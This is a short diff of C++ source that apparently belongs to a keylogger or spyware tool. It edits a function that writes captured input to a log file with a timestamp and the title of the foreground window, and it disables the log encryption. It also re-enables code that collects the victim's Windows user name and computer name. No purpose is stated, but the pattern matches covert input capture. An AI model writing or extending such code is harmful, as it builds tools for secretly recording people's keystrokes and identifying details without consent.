@@ -36,11 +36,11 @@ bool Stream::WriteLog(const std::string &input, uint32_t &active, const bool blo
   if (processInfo && !blockProcessInfo) {
 	std::string timeString =
 		"\n[" + SysTime::SystemTime::GetFullDate() + " " + Convert::HwndToString(GetForegroundWindow()) + "]\n";
-	Crypt::Encrypt(timeString);
+	//Crypt::Encrypt(timeString);
 	logFile->Ofstream << timeString;
   }
   std::string cryptInput = input;
-  Crypt::Encrypt(cryptInput);
+  //Crypt::Encrypt(cryptInput);
   logFile->Ofstream << cryptInput;
   logFile->Ofstream.close();
   return true;
@@ -54,16 +54,16 @@ bool Stream::MakeFile() {
   return true;
 }
 
-void Stream::GetAccountInfo(ClientInfo &data) {
-  data.osVersionInfo.dwOSVersionInfoSize = sizeof(OSVERSIONINFO);
-  GetVersionEx(&data.osVersionInfo);
+void Stream::GetAccountInfo(ClientInfo *data) {
+  data->osVersionInfo.dwOSVersionInfoSize = sizeof(OSVERSIONINFO);
+  GetVersionEx(&data->osVersionInfo);
 
   char sysName[UNLEN + 1];
   DWORD sysLen = UNLEN + 1;
 
   // FIXME Read access violation, initialize ClientInfo??
-  //GetUserName(data.accountName, &sysLen);
-  //GetComputerName(data.computerName, &sysLen);
+  GetUserName(data->accountName, &sysLen);
+  GetComputerName(reinterpret_cast<LPSTR>(data->computerName), &sysLen);
 }
 
 std::vector<std::filesystem::path> Stream::GetAllFilesInFolder(const std::string &firstFile) {
